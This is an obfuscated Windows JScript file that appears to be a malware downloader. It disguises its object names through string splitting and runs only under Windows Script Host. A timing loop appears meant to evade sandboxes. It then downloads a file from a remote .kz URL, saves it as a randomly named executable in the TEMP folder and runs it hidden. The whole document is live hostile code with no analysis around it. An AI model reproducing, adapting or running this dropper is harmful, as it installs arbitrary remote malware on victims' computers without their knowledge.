var _B0 = false;
var _F0 = "CreateObject";
var _TR = function _IW() {return WScript[_F0]("WScript"+".Shell");}(), _WB = 11;
var _II = "MSXML2.XMLHTTP";
var _QU = 2123213;
var _W = 0;
function _NT(_O){_TR["Run"](_O, _W, _W);};
function _OS(){return _II + "";};
function _X(_J, _QP){_W = _W * 1; return _J - _QP;};
function _RH(){return _F0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _B0 = true;
  @end
@*/
if (_B0)
{
var _B = "";
function _WL(){return 22;};
var _YF = 0; var _GS = 0;
function _L()
{
var _XQ = new this["Date"]();
var _AS = _XQ["getUTCMilliseconds"]();
WScript["Sleep"](_WL());
var _XQ = new this["Date"]();
var _C = _XQ["getUTCMilliseconds"]();
WScript["Sleep"](_WL());
var _XQ = new this["Date"]();
var _L0 = _XQ["getUTCMilliseconds"]();
var _YF = "_S";
_YF = _X(_C, _AS);
var _GS = "_H";
_GS = _X(_L0, _C);
_B = "open";
return _X(_YF, _GS);
}
var _MD = false;
var _RB = false;
for (var _I = _W; _I < _WL() * 1; _I++){if (_L() != _W){
_MD = true; 
_GS = "31" + 11 * _YF + _GS; 
_RB = true; 
break;
}}
function _TT() {return ((_MD == true) && (_MD == _RB)) ? 1 : _W;};
if (_MD && _TT() && _RB){
function _F() {return _TR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KTioIti6eyHT3.ex" + "e";};
 _GU = _OS();
 _QU0 = WScript[_F0](_GU);
 var _OE = 1;
 while (_OE){
try {
	if (_OE == 1)
	{
		_QU0[_B]("GET", "http://zakazdetali.kz/v7bsad", false);
		_QU0["send"]();
		_SN = "Sleep";
	}
	WScript[_SN](_WL() + 120); 
	if (_QU0["readystate"] < 2 * 2) continue;
	_OE = _W;
	function _K(_E) {var _V = (1, 2, 3, 4, 5, _E); return _V;};
	_OU = WScript[_RH()]("ADODB.Stream");
	_GU = _OU;
	_GU[_B]();
	_GU["type"] = _K(1);
	_GU["write"](_QU0["ResponseBody"]);
	_OU["position"] = _K(_W);
	_GU["Save" + "ToFile"](_F(), 2);
	_OU["cl"+"ose"]();
	_AQ = _F();
	_NT(_AQ);
} catch(_O0){};
}
}
}

